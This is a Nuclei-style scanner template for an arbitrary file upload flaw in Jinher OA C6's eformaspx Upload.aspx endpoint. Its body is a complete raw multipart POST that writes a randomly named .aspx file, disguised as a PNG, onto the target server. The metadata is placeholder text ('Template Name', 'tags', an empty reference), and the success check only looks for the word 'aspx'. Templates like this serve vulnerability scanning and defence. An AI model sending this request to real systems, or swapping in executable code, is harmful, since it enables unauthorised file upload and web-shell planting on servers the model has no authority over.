id: jinher-eformaspx-upload
info:
  name: Template Name
  author: wangzong
  severity: info
  description: 金和OAeformaspx接口存在任意文件上传
  reference:
    - https://
  tags: tags
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{rand_base(8)}}"
http:
  - raw:
      - |-
        POST /C6/JHSoft.Web.Module/eformaspx/Upload.aspx/?path=/C6/JHSoft.Web.Module&setpath=undefined&id=undefined HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: multipart/form-data; boundary=---------------------------2236019043328132895717{{boundary}}
        Content-Length: 454
        Cookie: ASP.NET_SessionId=wzknlt2nk5eegxtyd1h3igev
        Upgrade-Insecure-Requests: 1

        -----------------------------2236019043328132895717{{boundary}}
        Content-Disposition: form-data; name="txtBz"
        /C6/JHSoft.Web.Module
        -----------------------------2236019043328132895717{{boundary}}
        Content-Disposition: form-data; name="pic"; filename="{{filename}}.aspx"
        Content-Type: image/png
        aaa
        -----------------------------2236019043328132895717{{boundary}}
        Content-Disposition: form-data; name="Submit"
        -----------------------------2236019043328132895717{{boundary}}--
    matchers:
      - type: word
        part: body
        words:
          - 'aspx'
